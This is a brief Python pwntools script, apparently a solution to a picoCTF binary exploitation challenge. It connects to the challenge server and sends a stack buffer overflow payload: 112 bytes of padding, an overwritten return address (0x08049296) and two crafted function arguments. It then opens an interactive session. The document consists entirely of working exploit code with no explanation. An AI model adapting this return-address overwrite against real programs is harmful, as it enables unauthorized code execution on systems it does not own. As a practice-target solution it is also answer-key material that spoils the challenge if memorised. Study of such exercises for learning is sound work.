from pwn import *

r = remote("saturn.picoctf.net" , 50428)

r.recvuntil(b"Please enter your string:")

payload = b"a"*112 + p32(0x08049296) + b"aaaa"
arg1 = p32(0xcafef00d)
arg2 = p32(0xf00df00d)
payload += arg1
payload += arg2

r.sendline(payload)

r.interactive()
